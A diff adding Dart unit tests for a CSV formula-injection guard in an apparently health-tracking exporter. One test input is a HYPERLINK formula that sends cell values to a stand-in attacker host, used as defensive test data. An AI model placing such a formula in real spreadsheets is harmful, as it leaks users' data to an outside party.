@@ -75,6 +75,56 @@ void main() {
     });
   });
 
+  group('escapeCsvField: Issue #563 formula-injection guard', () {
+    void expectGuarded(String input) {
+      expect(escapeCsvField(input), "\"'$input\"", reason: input);
+    }
+
+    test('a field starting with = is prefixed with an apostrophe and '
+        'force-quoted', () => expectGuarded('=1+1'));
+
+    test('a field starting with + is prefixed with an apostrophe and '
+        'force-quoted', () => expectGuarded('+1+1'));
+
+    test('a field starting with - is prefixed with an apostrophe and '
+        'force-quoted', () => expectGuarded('-1+1'));
+
+    test('a field starting with @ is prefixed with an apostrophe and '
+        'force-quoted', () => expectGuarded('@SUM(A1:A9)'));
+
+    test('a field starting with a tab is prefixed with an apostrophe and '
+        'force-quoted', () => expectGuarded('\t=1+1'));
+
+    test('a field starting with a bare CR is prefixed with an apostrophe '
+        'and force-quoted', () => expectGuarded('\r=1+1'));
+
+    test('a field that also needs RFC 4180 quoting (embedded comma and '
+        'quotes) is still just single-apostrophe-prefixed and quoted once',
+        () {
+      const formula = '=HYPERLINK("https://evil.example/?x="&A1&B1,"Open")';
+      expect(
+        escapeCsvField(formula),
+        '"\'=HYPERLINK(""https://evil.example/?x=""&A1&B1,""Open"")"',
+      );
+    });
+
+    test('an ordinary field starting with a harmless character is '
+        'untouched (no leading apostrophe added when there is nothing to '
+        'guard against)', () {
+      expect(escapeCsvField('normal text'), 'normal text');
+      expect(escapeCsvField('2026-03-01'), '2026-03-01');
+    });
+
+    test('Issue #563: a value legitimately starting with "-" is still '
+        'guarded — a deliberate, documented trade-off, not an oversight. '
+        'It is safe for this exporter because none of its numeric columns '
+        'can legitimately be negative: bbt/weight are physical '
+        'measurements (always positive), and every other numeric column '
+        'is a non-negative count or an ISO date', () {
+      expectGuarded('-97.8');
+    });
+  });
+
   group('formatCsvRow and formatCsvTable', () {
     test('formats row with comma separation and escapes fields', () {
       final row = formatCsvRow(['2026-03-01', 'heavy', 'cramps, bad']);
